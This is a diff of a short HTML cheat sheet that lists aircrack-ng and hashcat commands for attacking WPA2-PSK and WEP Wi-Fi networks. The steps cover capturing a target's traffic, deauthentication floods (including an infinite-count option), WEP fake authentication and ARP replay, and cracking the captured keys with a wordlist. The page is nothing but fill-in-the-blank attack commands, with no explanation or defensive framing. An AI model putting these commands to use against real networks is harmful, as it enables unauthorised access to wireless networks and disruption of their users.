@@ -11,15 +11,13 @@
 <body>
     <h1>WPA2-PSK</h1>
     <p>airodump-ng --channel [channel] --bssid [bssid] --write [file] [wlan0mon]</p>
-    <p>aireplay-ng --deauth 5 -a [bssid] [wlan0mon]</p>
-    <p>aircrack-ng -a2 -b [bssid] -w [wordlist] [path.cap]</p>
+    <p>aireplay-ng --deauth [count;0=infinite] -a [bssid] [wlan0mon]</p>
+    <p>aircrack-ng -a2 -b [bssid] -w [wordlist] [cap]</p>
     <p>hashcat -m 2500 [hccapx] [wordlist]</p>
     <h1>WEP</h1>
-    <p>airmon-ng check kill</p>
-    <p>airmon-ng start [wlan0]</p>
-    <p>airodump-ng [wlan0mon]</p>
     <p>airodump-ng --channel [channel] --bssid [bssid] --write [file] [wlan0mon]</p>
-    <p>aireplay-ng --deauth 5 -a [bssid] [wlan0mon]</p>
-    <p>aircrack-ng -a2 -b [bssid] -w  </p>
+    <p>aireplay-ng -1 [count;0=infinite] -a [bssid] [wlan0mon]</p>
+    <p>aireplay-ng -3 [count;0=infinite] -a [bssid] [wlan0mon]</p>
+    <p>aircrack-ng [cap]</p>
 </body>
 </html>
